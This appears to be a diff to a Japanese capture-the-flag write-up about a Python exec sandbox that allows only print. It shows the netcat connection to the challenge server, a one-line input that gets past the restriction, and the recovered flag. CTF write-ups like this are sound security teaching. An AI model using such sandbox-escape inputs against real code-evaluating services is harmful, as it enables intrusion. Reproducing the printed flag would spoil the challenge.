@@ -31,7 +31,10 @@ printのみ実行できるという意味。
 ```
 exec(compiled, {"__builtins__": {"print": print}}, {})
 ```
+
+```
 nc 34.170.146.252 26003
 Show me your magic 🪄
 0;print("/*flag*/")
 Alpaca{d0n7_m4k3_5uch_4_5111y_m1574k3}
+```
